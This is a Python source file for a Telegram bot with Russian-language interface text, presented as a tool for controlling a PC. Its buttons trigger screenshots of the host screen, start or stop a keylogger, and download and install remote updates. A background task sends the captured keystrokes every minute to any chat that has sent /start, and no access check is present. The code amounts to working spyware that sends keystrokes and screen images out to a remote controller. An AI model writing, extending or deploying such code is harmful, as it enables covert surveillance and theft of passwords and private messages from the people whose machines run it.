import asyncio
import logging
import os
import threading
import time
from io import BytesIO

from dotenv import load_dotenv
from PIL import Image
import mss

from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

from keylogger import keylogger
from updater import updater


logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)


def load_environment_variables() -> None:
    load_dotenv(override=False)


def get_bot_token_from_env() -> str:
    token = os.getenv("BOT_TOKEN", "").strip()
    if not token:
        raise RuntimeError(
            "Не найден BOT_TOKEN. Создайте файл .env (на основе .env.example) и укажите токен."
        )
    return token


def build_main_keyboard() -> ReplyKeyboardMarkup:
    keyboard = [
        [KeyboardButton(text="📸 Скриншот")],
        [KeyboardButton(text="⌨️ Кейлоггер ВКЛ"), KeyboardButton(text="⌨️ Кейлоггер ВЫКЛ")],
        [KeyboardButton(text="🔄 Проверить обновления"), KeyboardButton(text="⬆️ Обновить")],
    ]
    return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True, one_time_keyboard=False)


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Добавляем чат в список активных
    active_chats.add(update.effective_chat.id)
    
    status = "ВКЛ" if keylogger.is_running() else "ВЫКЛ"
    current_version = updater.get_current_version()
    await update.message.reply_text(
        text=(
            "Привет! Я бот для управления ПК.\n"
            f"Версия: {current_version}\n"
            f"Кейлоггер: {status}\n"
            "Доступные действия:\n"
            "• 📸 Скриншот — снимок экрана\n"
            "• ⌨️ Кейлоггер ВКЛ/ВЫКЛ — захват клавиш\n"
            "• 🔄 Проверить обновления — проверить новые версии\n"
            "• ⬆️ Обновить — скачать и установить обновление"
        ),
        reply_markup=build_main_keyboard(),
        parse_mode=ParseMode.HTML,
    )


def capture_screenshot_bytes() -> bytes:
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        raw = sct.grab(monitor)
        image = Image.frombytes("RGB", raw.size, raw.rgb)
        buffer = BytesIO()
        image.save(buffer, format="PNG")
        return buffer.getvalue()


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.message.text:
        return

    text = update.message.text.strip()
    if text == "📸 Скриншот":
        try:
            await update.message.chat.send_action(action="upload_photo")
            photo_bytes = capture_screenshot_bytes()
            await update.message.reply_photo(photo=photo_bytes, caption="Скриншот экрана")
        except Exception as error:  # noqa: BLE001
            logger.exception("Ошибка при создании скриншота")
            await update.message.reply_text(f"Ошибка при создании скриншота: {error}")
        return
    
    elif text == "⌨️ Кейлоггер ВКЛ":
        try:
            keylogger.start_logging()
            await update.message.reply_text("✅ Кейлоггер включён. Каждую минуту будет отправляться накопленный текст.")
        except Exception as error:
            logger.exception("Ошибка при включении кейлоггера")
            await update.message.reply_text(f"Ошибка при включении кейлоггера: {error}")
        return
    
    elif text == "⌨️ Кейлоггер ВЫКЛ":
        try:
            keylogger.stop_logging()
            await update.message.reply_text("❌ Кейлоггер выключен.")
        except Exception as error:
            logger.exception("Ошибка при выключении кейлоггера")
            await update.message.reply_text(f"Ошибка при выключении кейлоггера: {error}")
        return
    
    elif text == "🔄 Проверить обновления":
        try:
            await update.message.reply_text("🔍 Проверяю обновления...")
            has_update, version, message = updater.check_for_updates()
            
            if has_update:
                await update.message.reply_text(
                    f"✅ Найдено обновление!\n"
                    f"Новая версия: {version}\n"
                    f"Нажмите '⬆️ Обновить' для установки"
                )
            else:
                await update.message.reply_text(f"ℹ️ {message}")
        except Exception as error:
            logger.exception("Ошибка при проверке обновлений")
            await update.message.reply_text(f"Ошибка при проверке обновлений: {error}")
        return
    
    elif text == "⬆️ Обновить":
        try:
            await update.message.reply_text("⬆️ Начинаю обновление...")
            success, message = updater.update()
            
            if success:
                await update.message.reply_text(
                    f"✅ {message}\n"
                    f"Бот будет перезапущен через 3 секунды..."
                )
                # Даём время отправить сообщение
                await asyncio.sleep(3)
                # Перезапускаем бота
                updater.restart_bot()
            else:
                await update.message.reply_text(f"❌ {message}")
        except Exception as error:
            logger.exception("Ошибка при обновлении")
            await update.message.reply_text(f"Ошибка при обновлении: {error}")
        return

    await update.message.reply_text(
        "Не понял запрос. Нажмите кнопку на клавиатуре или отправьте /start",
        reply_markup=build_main_keyboard(),
    )


# Глобальная переменная для хранения активных чатов
active_chats = set()

async def periodic_keylogger_sender(application):
    """Фоновая задача для отправки накопленного текста каждую минуту."""
    while True:
        try:
            await asyncio.sleep(60)  # каждую минуту
            if keylogger.is_running():
                text = keylogger.get_accumulated_text()
                if text.strip():  # если есть текст
                    # Отправляем всем активным чатам
                    for chat_id in active_chats.copy():
                        try:
                            # Ограничиваем длину сообщения (Telegram лимит ~4000 символов)
                            if len(text) > 3000:
                                text_to_send = text[:3000] + "\n... (обрезано)"
                            else:
                                text_to_send = text
                            
                            await application.bot.send_message(
                                chat_id=chat_id,
                                text=f"⌨️ Накопленный текст за минуту:\n\n{text_to_send}"
                            )
                        except Exception as e:
                            logger.warning(f"Не удалось отправить в чат {chat_id}: {e}")
                            # Удаляем неактивный чат
                            active_chats.discard(chat_id)
        except Exception as e:
            logger.exception("Ошибка в периодической отправке кейлоггера: %s", e)


async def main() -> None:
    load_environment_variables()
    token = get_bot_token_from_env()

    application = ApplicationBuilder().token(token).build()
    application.add_handler(CommandHandler("start", cmd_start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    logger.info("Бот запускается... Нажмите Ctrl+C для остановки.")
    await application.initialize()
    await application.start()
    
    # Запускаем фоновую задачу для кейлоггера
    keylogger_task = asyncio.create_task(periodic_keylogger_sender(application))
    
    try:
        await application.updater.start_polling()
        while True:
            await asyncio.sleep(3600)
    finally:
        keylogger_task.cancel()
        await application.updater.stop()
        await application.stop()
        await application.shutdown()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Бот остановлен пользователем.")


